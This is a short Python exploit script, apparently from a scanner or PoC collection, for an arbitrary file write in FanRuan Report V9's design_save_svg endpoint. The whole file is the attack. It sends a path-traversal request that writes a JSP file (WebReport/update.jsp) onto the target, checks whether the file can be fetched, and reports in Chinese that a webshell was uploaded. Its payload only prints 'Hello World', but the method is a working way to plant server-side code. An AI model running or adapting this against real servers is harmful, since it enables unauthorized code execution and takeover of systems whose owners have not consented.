import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


headersx = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
}


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
        "Content-Type": "application/json",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Upgrade-Insecure-Requests": "1"
    }
    exp_url = target_url + "WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp"
    data = '''{"__CONTENT__":"<%out.println(\"Hello World!\");%>","__CHARSET__":"UTF-8"}'''
    print(now_time() + " [INFO]     正在检测帆软报表 V9 design_save_svg 任意文件覆盖文件上传")
    shell_url = target_url + "WebReport/update.jsp"
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        respones = requests.get(shell_url, headers=headersx, verify=False)
        if respones.status_code == 200 and 'Hello' in respones.text:
            shell_url = target_url + "WebReport/update.jsp"
            print(now_time() + ' [SUCCESS]  上传webshell成功{}'.format(shell_url))
        else:
            print(now_time() + ' [WARNING]  帆软报表 V9 design_save_svg 任意文件覆盖文件上传漏洞不存在')
    except:
        print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ")
